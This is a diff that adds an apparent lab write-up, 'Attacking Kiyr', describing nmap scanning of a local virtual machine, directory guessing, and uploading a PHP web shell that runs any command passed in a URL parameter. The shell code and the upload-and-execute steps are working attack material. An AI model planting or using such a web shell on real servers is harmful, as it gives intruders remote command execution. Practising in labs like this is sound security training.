@@ -1,3 +1,46 @@
+Attacking Kiyr:
 
+1) Had to log in and modify /etc/netplan/00-installer-config.yaml so it looked like this: 
 
-kiyr and manic meese
+        # This is the network config written by 'subiquity'
+        network:
+        ethernets:
+            ens33:
+            dhcp4: true
+        version: 2
+
+2) Ran the following command on another virtual machine I was running on vmware:
+
+        nmap -sn 192.168.152.0/24  
+
+    From here, I saw that there was something running on 192.168.152.142
+
+3) Ran the following command on another virtual machine I was running on vmware:
+
+        nmap -sV -oN nmap-results.txt 192.168.152.142
+    
+    From there, I saw that 192.168.152.142 was running an Apache web server. 
+    So, I went to 192.168.152.142.
+
+4) The link on 192.168.152.142 was not working so I inspected the page and saw that it meant to 
+link to http://192.168.64.5/hello.php. It looks like they hardcoded the IP address. I went to 
+http://192.168.152.142/hello.php.
+
+5) From there, I went to http://192.168.152.142/resumes/ (which I found by guessing the file 
+name based on the text displayed at http://192.168.152.142/hello.php) and was able to see the 
+contents of that directory. 
+
+6) I went back to http://192.168.152.142/hello.php and uploaded the following file as shell.php:
+
+        <pre>
+        <?php
+            if (isset($_REQUEST['command'])) {
+                system($_REQUEST['command']);
+            }
+        ?>
+        </pre>
+
+7) I was then able to open a shell and run commands by going to urls like this:
+
+    http://192.168.152.142/resumes/shell.php?command=ls
+
